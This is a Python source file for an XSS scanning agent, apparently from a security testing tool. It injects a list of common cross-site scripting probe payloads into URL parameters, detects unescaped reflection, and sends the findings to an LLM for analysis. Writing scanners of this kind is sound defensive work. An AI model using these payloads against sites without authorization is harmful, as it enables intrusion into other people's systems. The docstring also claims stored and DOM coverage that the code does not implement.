"""XSS Attack Agent — Reflected, Stored, DOM ❌"""
from briar.agents.analyzer import SecurityAnalyzer
from briar.core.http import HTTPClient

class XSSAgent:
    """Discovers Cross-Site Scripting with real payload injection"""

    XSS_PAYLOADS = [
        ("<script>alert(1)</script>", "script_tag"),
        ("\"><script>alert('XSS')</script>", "attribute_break"),
        ("<img src=x onerror=alert(1)>", "img_event"),
        ("<svg onload=alert(1)>", "svg_event"),
        ("' onfocus='alert(1) autofocus='", "attr_injection"),
        ("<body onload=alert(1)>", "body_event"),
        ("javascript:alert(1)", "js_uri"),
        ("{{constructor.constructor('alert(1)')()}}", "ssti_xss"),
    ]

    def __init__(self, provider="ollama"):
        self.analyzer = SecurityAnalyzer(provider)
        self.http = HTTPClient(timeout=10)
        self.name = "XSS"

    def scan(self, url: str, inputs: list = None, **kwargs) -> dict:
        """Scan for XSS with real payload injection and reflection detection"""
        findings = []
        params = inputs or ["q", "search", "query", "id", "name", "message", "comment", "url"]

        for param in params[:6]:
            for payload, xss_type in self.XSS_PAYLOADS:
                try:
                    result = self.http.send_payload(url, param, payload)
                    if "error" in result:
                        continue

                    text = result.get("text_snippet", "")

                    # Reflection detection
                    if self.http.has_reflection(text, payload):
                        # Check if reflected inside a tag (unescaped)
                        escaped = False
                        for char in ['&lt;', '&gt;', '&quot;', '&#x27;']:
                            if char in text:
                                escaped = True
                                break

                        if not escaped:
                            findings.append({
                                "type": f"Reflected XSS ({xss_type})",
                                "severity": "High",
                                "param": param,
                                "payload": payload,
                                "xss_type": xss_type,
                                "status": result["status"],
                                "reflected": True,
                                "escaped": False,
                            })
                            break  # Found XSS on this param, move to next

                    # Also check URL-decoded reflection
                    from urllib.parse import unquote
                    decoded_text = unquote(text)
                    if self.http.has_reflection(decoded_text, unquote(payload)):
                        findings.append({
                            "type": f"XSS potential (decoded reflection)",
                            "severity": "Medium",
                            "param": param,
                            "payload": payload,
                            "xss_type": xss_type,
                            "reflected": True,
                            "escaped": False,
                        })
                        break

                except:
                    pass

        analysis = f"XSS scan complete for {url}\n\n"
        if findings:
            analysis += f"**{len(findings)} XSS vulnerabilities found:**\n\n"
            for f in findings:
                analysis += f"- **{f['param']}**: {f['type']} — payload `{f['payload']}` reflected\n"
            analysis += "\n---\n\nLLM analysis of real XSS findings:\n"
            llm_result = self.analyzer.analyze_endpoint(url, "GET", analysis)
            llm_result["real_findings"] = findings
            llm_result["payloads_tested"] = [p[0] for p in self.XSS_PAYLOADS[:4]]
        else:
            analysis += "No reflected XSS detected. Payloads tested but not reflected unescaped.\n\nLLM analysis:\n"
            llm_result = self.analyzer.analyze_endpoint(url, "GET", analysis)
            llm_result["real_findings"] = findings
            llm_result["payloads_tested"] = [p[0] for p in self.XSS_PAYLOADS[:4]]

        llm_result["agent"] = self.name
        llm_result["type"] = "XSS"
        llm_result["severity"] = "High" if findings else "Info"
        return llm_result
